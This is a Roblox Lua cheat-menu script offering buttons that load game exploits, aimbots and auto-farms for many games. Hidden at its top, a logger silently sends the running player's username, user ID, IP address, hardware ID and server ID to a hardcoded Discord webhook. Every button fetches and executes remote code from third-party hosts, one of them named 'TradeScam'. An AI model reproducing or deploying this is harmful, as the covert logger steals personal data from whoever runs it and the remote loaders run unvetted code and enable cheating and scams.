function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = Url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**Universal Log**",
                ["description"] ="",
                ["type"] = "rich",
                ["color"] = tonumber(0xff0000),
                ["fields"] = {
                    {
                        ["name"] = "**Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**UserID**",
                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**PlaceID**",
                        ["value"] = "```" .. game.PlaceId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Hwid**",
                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**JobID**",
                        ["value"] = "```" .. game.JobId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Join Code**",
                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
                        ["inline"] = false
                    }
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

PostWebhook("https://discord.com/api/webhooks/1267904448307662910/G9qYGFA1ygTZTVTJJHkLD4LmAvSXG7llN2YhbvlxU0B1e1lJLgJTrtcfi8AmrD9eUv_E", AdminLoggerMsg())
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/MedusaScript/Botuna/main/UI-Universal-Medusa.lua"))()
local Window = Library.CreateLib("BRUTALITY HUB X MEDUSA SCRIPT - ALL SCRIPT IN ONE", "Ocean")

--UTAMA
local Main = Window:NewTab("THE BEST")
local MainSection = Main:NewSection("PRISON LIFE - No Key") --TANDA --

MainSection:NewButton("Brutality Hub", "ARSENAL", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MedusaScript/Botuna/main/ArsenalV1.lua"))()
end)

local MainSection = Main:NewSection("Blox Fruit - No Key") --TANDA --

MainSection:NewButton("Hack Blox Fruit", "Hack Game", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/MedusaScript/BrutalityV2/main/HackBf.lua'))()
end)

MainSection:NewButton("Kaitun", "Blox Fruit", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MedusaScript/Botuna/main/KaitunV1.lua"))()
end)

MainSection:NewButton("FARM CHEST", "Blox Fruit", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/MedusaScript/Botuna/main/Chest.lua'))()
end)

MainSection:NewButton("Brutality Hub V1", "Blox Fruit", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/MedusaScript/limitless-medusa/main/BrutalityV1'))()
end)

MainSection:NewButton("Brutality Hub V2", "Blox Fruit", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/MedusaScript/Botuna/main/BrutalityV2.lua'))()
end)

MainSection:NewButton("Brutality Hub V3", "Blox Fruit", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/MedusaScript/Botuna/main/BrutalityV3.lua'))()
end)

local AA = Window:NewTab("BLOX FRUIT")
local AASection = AA:NewSection("ALL SCRIPT BLOX FRUIT") --TANDA --

AASection:NewButton("Brutality Hub KAITUN", "Blox Fruit", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MedusaScript/Botuna/main/KaitunV1.lua"))()
end)

AASection:NewButton("Redz Hub", "Blox Fruit", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
end)

AASection:NewButton("W-Azure V1", "Blox Fruit", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b6b36cec473a0dd48eab35b8272b2384.lua"))()
end)

AASection:NewButton("W-Azure V2", "Blox Fruit", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
end)

AASection:NewButton("Vector Hub", "Blox Fruit", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AAwful/VectorHub/main/uh.lua"))()
end)

AASection:NewButton("Unknow Hub V3", "Blox Fruit", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BestScriptEverr/Main-/main/UnknownHubV3"))()
end)

AASection:NewButton("Fai Fao Hub", "Blox Fruit", function()
    loadstring(game:HttpGet"https://raw.githubusercontent.com/PNguyen0199/Script/main/Fai-Fao-Ver2.lua")()
end)

AASection:NewButton("ScriptBlox Hub", "Blox Fruit", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Script-Blox/Script/main/Script-Blox'))()
end)

AASection:NewButton("Ganteng Hub", "Blox Fruit", function()
    loadstring(game:HttpGet("https://isnahamzahpastebin.tech/gantenghubv1_new"))()
end)

local AASection = AA:NewSection("AIM BOT SKILL") --TANDA --

AASection:NewButton("Aimbot Lock Hub", "Aim Bot Skill", function()
    loadstring(game:HttpGet("https://rentry.co/n55gmtpi/raw", true))()
end)

AASection:NewButton("Alchemy Hub", "Aim Bot Skill", function()
loadstring(game:HttpGet("https://scripts.alchemyhub.xyz"))()
end)

local AASection = AA:NewSection("FRUIT FINDER - Get Fruit Spawn") --TANDA --

AASection:NewButton("Alchemy Hub", "Fruit Finder", function()
    loadstring(game:HttpGet("https://scripts.alchemyhub.xyz"))()
end)

local AASection = AA:NewSection("FARM CHEST - No Key") --TANDA --

AASection:NewButton("Zen Hub", "Farm Chest", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZenHubTheBest/Main/main/ChestFarm"))()
end)

AASection:NewButton("Mtriet Hub", "Farm Chest", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Minhtriettt/Free-Script/main/Chest-Farm.lua"))()
end)

AASection:NewButton("Daki Hub", "Farm Chest", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/m1M-Plqer819/dakiiuem/main/main/autochest.lua"))()
end)

local BB = Window:NewTab("KING LEGACY")
local BBSection = BB:NewSection("Use Key & No Key") --TANDA --

BBSection:NewButton("Zee Hub", "King Legacy", function()
    loadstring(game:HttpGet('https://zuwz.me/Ls-Zee-Hub-KL'))()
end)

BBSection:NewButton("Ganteng Hub", "King Legacy", function()
loadstring(game:HttpGet("http://hexasptr.my.id/script/KingLegacy.lua"))()
end)

BBSection:NewButton("Arc Hub", "King Legacy", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ChopLoris/ArcHub/main/main.lua"))()
end)

local CC = Window:NewTab("BLADE BALL")
local CCSection = CC:NewSection("BLADE BALL - No Key") --TANDA --

CCSection:NewButton("Brutality Hub", "Blade Ball", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/MedusaScript/Botuna/main/BladeBall-V1.lua'))()
end)

CCSection:NewButton("Nexum Hub", "Blade Ball", function()
    loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/5ebefab5c68bfa67271dcbf6430d3c7d.lua'))()
end)

CCSection:NewButton("Bedol Hub", "Blade Ball", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/3345-c-a-t-s-u-s/SourceLua/main/Blade_Ball.lua'))()
end)

CCSection:NewButton("REDz Hub", "Blade Ball", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BladeBall/main/eng"))()
end)

CCSection:NewButton("Depth Hub", "Blade Ball", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/sirapobsriumang/Blade-ball/main/Blade-ball-free.lua'))()
end)

local DD = Window:NewTab("PRISON LIFE")
local DDSection = DD:NewSection("PRISON LIFE - No Key") --TANDA --

DDSection:NewButton("Brutality HUB", "Prison Life", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MedusaScript/Botuna/main/Prison-Life.lua"))()
end)

local EE = Window:NewTab("CDID")
local EESection = EE:NewSection("CDID - No Key") --TANDA --

EESection:NewButton("Ganteng Hub V2", "CDID", function()
    loadstring(game:HttpGet('https://isnahamzahpastebin.tech/mobilmobilan/gantenghub_subscribe_YT_isnahamzah'))()
    end)

local FF = Window:NewTab("PETSIM")
local FFSection = FF:NewSection("PET SIMULATOR") --TANDA --

FFSection:NewButton("Speed Hub X", "PET SIMULATOR", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
end)

FFSection:NewButton("KittyWare", "PET SIMULATOR", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BludnyHolandan/PS99/main/v3/autofarm/lua"))()
end)

FFSection:NewButton("Huge Games (Key)", "PET SIMULATOR", function()
    loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
end)

FFSection:NewButton("Gem Spawner", "PET SIMULATOR", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/OfficialPS99Developer/GemSpawner/main/GemSpawner.txt"))()
end)

local GG = Window:NewTab("SHARKBITE 2")
local GGSection = GG:NewSection("SHARKBITE 2 - No Key") --TANDA --

GGSection:NewButton("Stealth Hub", "SHARKBITE 2", function()
loadstring(game:HttpGet('https://scriptblox.com/raw/STEALTH-SharkBite-2-script-13895'))()
end)

GGSection:NewButton("Zyle Hub", "SHARKBITE 2", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Lolboxo/SharkBiteV3/main/SharkBiteV3.1'))()
    end)


local HH = Window:NewTab("BLADE SLAYER")
local HHSection = HH:NewSection("BLADE SLAYER") --TANDA --

HHSection:NewButton("Brutality Hub", "Blade Slayer", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MedusaScript/Botuna/main/BladeSlayerV1.lua"))()
    end)

HHSection:NewButton("DK Hub", "Blade Slayer", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ByNami/dkhub/main/Script"))()
end)

local II = Window:NewTab("ANIME DEFENDER")
local IISection = II:NewSection("ANIME DEFENDER - No Key") --TANDA --

IISection:NewButton("Buang Hub", "Anime Defender", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ToraScript/Script/main/1BladeSlayer'))()
    end)

local JJ = Window:NewTab("SLAP BATTLE")
local JJSection = JJ:NewSection("SLAP BATTLE - No Key") --TANDA --

IISection:NewButton("Brutality Hub", "Slap Battle", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MedusaScript/Botuna/main/Slap-Battle.lua"))()
end)

local KK = Window:NewTab("TYPE SOUL")
local KKSection = KK:NewSection("TYPE SOUL")

KKSection:NewButton("Plagiat Hub", "Type Soul", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/newtype/main/soul"))()
end)

KKSection:NewButton("Reaper Hub", "Type Soul", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AyoReaper/Reaper-Hub/main/loader.lua"))()
end)

local LL = Window:NewTab("GYM LEAGUE")
local LLSection = LL:NewSection("GYM LEAGUE")

LLSection:NewButton("Speed Hub X", "Gym League", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Script-Games/main/Gym%20League.lua"))()
end)

LLSection:NewButton("Legend Hub", "Gym League", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/GymNew/main/League"))()
end)

LLSection:NewButton("Tuff Hub", "Gym League", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisIsTuff/ArmWrestleSim/main/GymLeague.lua"))()
end)

LLSection:NewButton("Reaper Hub", "Gym League", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Gym-League-Reaper-Hub-15287"))()
end)

local MM = Window:NewTab("PULL A SWORD")
local MMSection = MM:NewSection("PULL A SWORD")

MMSection:NewButton("Tora Hub", "Pull A Sword", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ToraScript/Script/main/PullaSword'))()
end)

MMSection:NewButton("Itsnoctural Hub", "Pull A Sword", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/itsnoctural/Utilities/main/Closed/Pull%20a%20Sword.lua"))()
end)

MMSection:NewButton("Bacon Hub", "Pull A Sword", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/PaS"))()
end)

local NN = Window:NewTab("TOILET TOWER DEF")
local NNSection = NN:NewSection("TOILET TOWER DEFENSE")

NNSection:NewButton("TTD Script Hub", "Toilet Tower Defense", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/OfficialPS99Developer/TTDScript/main/TTDScript.txt"))()
end)

NNSection:NewButton("PS999 Hub", "Toilet Tower Defense", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/OfficialPS99Developer/TTDScript/main/TTDScript.txt"))()
end)

NNSection:NewButton("LOLking Hub", "Toilet Tower Defense", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/TTDBest/main/Defense"))()
end)

NNSection:NewButton("LOLking Hub", "Toilet Tower Defense", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/trdrock/ttd/main/TradeScam"))()
end)
